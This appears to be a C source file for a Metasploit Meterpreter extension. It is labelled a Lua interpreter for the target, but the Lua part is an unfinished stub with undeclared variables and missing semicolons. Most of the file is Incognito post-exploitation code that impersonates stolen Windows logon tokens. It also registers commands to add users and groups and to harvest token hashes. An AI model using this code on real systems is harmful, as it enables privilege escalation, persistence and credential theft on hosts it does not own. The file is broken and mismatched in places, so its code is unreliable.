/*
 * This module implements the lua interpreter running on the target
 */
#include "precomp.h"

//include the lua libs, probably need to edit lua source to allow in mem only processing?
//#include "lua.h"
//#include "lauxlib.h"
//#include "lualib.h" 
 
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#ifdef _WIN32
 #include "../../../ReflectiveDLLInjection/ReflectiveLoader.c"
#endif

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

//general
extern DWORD request_lua_run_script(Remote *remote, Packet *packet);
extern DWORD request_lua_load_extension(Remote *remote, Packet *packet);

void bail(lua_State *L, char *msg){
	fprintf(stderr, "\nFATAL ERROR:\n  %s: %s\n\n",
		msg, lua_tostring(L, -1));
	//exit(1);
}

DWORD request_lua_run_script(Remote *remote, Packet *packet)
{
	// Get the script name from packet
	// TODO:  get the actual script (or rather, send the sript, not the name)
	Packet *response = packet_create_response(packet);
	lua_script = packet_get_tlv_value_string(packet, TLV_TYPE_LUA_RUN_SCRIPT);
    lua_State *L;

    L = luaL_newstate();                        /* Create Lua state variable */
    luaL_openlibs(L);                           /* Load Lua libraries */

	// TODO:  This method will read the file passed in, we don't want to do that, we have the 
	// contents of the script already (in theory, see above TODO)
    if (luaL_loadfile(L, lua_script))    /* Load but don't run the Lua script */
	{
		bail(L, "luaL_loadfile() failed");      /* Error out if file can't be read */
		return 1
	}
	//DEBUG
    printf("In C, calling Lua\n");

    if (lua_pcall(L, 0, 0, 0))                 /* Run the loaded Lua script */
	{
		bail(L, "lua_pcall() failed");          /* Error out if Lua file has an error */
		return 2
	}
	//DEBUG
    printf("Back in C again\n");

	// TODO:  Don't close lua state if multiple scripts, or otherwise save it for later?
    lua_close(L);                               /* Clean up, free the Lua state var */

    return ERROR_SUCCESS;
}

DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
{
	DWORD num_unique_tokens = 0, num_tokens = 0, i;
	unique_user_token *uniq_tokens = calloc(BUF_SIZE, sizeof(unique_user_token));
	SavedToken *token_list = NULL;
	BOOL bTokensAvailable = FALSE, delegation_available = FALSE;
	char temp[BUF_SIZE] = "", *requested_username, return_value[BUF_SIZE] = "";
	HANDLE xtoken;

	Packet *response = packet_create_response(packet);
	requested_username = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN);
	
	// Enumerate tokens
	token_list = get_token_list(&num_tokens);

	if (!token_list)
	{
		sprintf(temp, "[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		goto cleanup;
	}

	// Process all tokens to get determinue unique names and delegation abilities
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, BY_USER);
		process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, BY_GROUP);
	}

	for (i=0;i<num_unique_tokens;i++)
	{
		if (!_stricmp(uniq_tokens[i].username, requested_username) )//&& uniq_tokens[i].impersonation_available)
		{
			if (uniq_tokens[i].delegation_available)
				delegation_available = TRUE;
			if (delegation_available)
				strncat(return_value, "[+] Delegation token available\n", sizeof(return_value)-strlen(return_value)-1);
			else
				strncat(return_value, "[-] No delegation token available\n", sizeof(return_value)-strlen(return_value)-1);

			for (i=0;i<num_tokens;i++)
			{
				if (is_token(token_list[i].token, requested_username))
				if (ImpersonateLoggedOnUser(token_list[i].token))
				{
					strncat(return_value, "[+] Successfully impersonated user ", sizeof(return_value)-strlen(return_value)-1);
					strncat(return_value, token_list[i].username, sizeof(return_value)-strlen(return_value)-1);
					strncat(return_value, "\n", sizeof(return_value)-strlen(return_value)-1);
				
					if (!DuplicateTokenEx(token_list[i].token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &xtoken)) {
						dprintf("[INCOGNITO] Failed to duplicate token for %s (%u)", token_list[i].username, GetLastError());
					} else {
						core_update_thread_token(remote, xtoken);
					}
					goto cleanup;
				}
			}
		}
	}
	
	strncat(return_value, "[-] User token ", sizeof(return_value)-strlen(return_value)-1);
	strncat(return_value, requested_username, sizeof(return_value)-strlen(return_value)-1);
	strncat(return_value, " not found\n", sizeof(return_value)-strlen(return_value)-1);
	
cleanup:
	for (i=0;i<num_tokens;i++)
		CloseHandle(token_list[i].token);
	free(token_list);
	free(uniq_tokens);

	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
	packet_transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}

Command customCommands[] =
{
	// List tokens
	{ "incognito_list_tokens",
	  { request_incognito_list_tokens,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Impersonate token
	{ "incognito_impersonate_token",
	  { request_incognito_impersonate_token,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Add user to host
	{ "incognito_add_user",
	  { request_incognito_add_user,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Add user to group
	{ "incognito_add_group_user",
	  { request_incognito_add_group_user,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Add user to local group
	{ "incognito_add_localgroup_user",
	  { request_incognito_add_localgroup_user,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Snarf token hashes
	{ "incognito_snarf_hashes",
	  { request_incognito_snarf_hashes,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
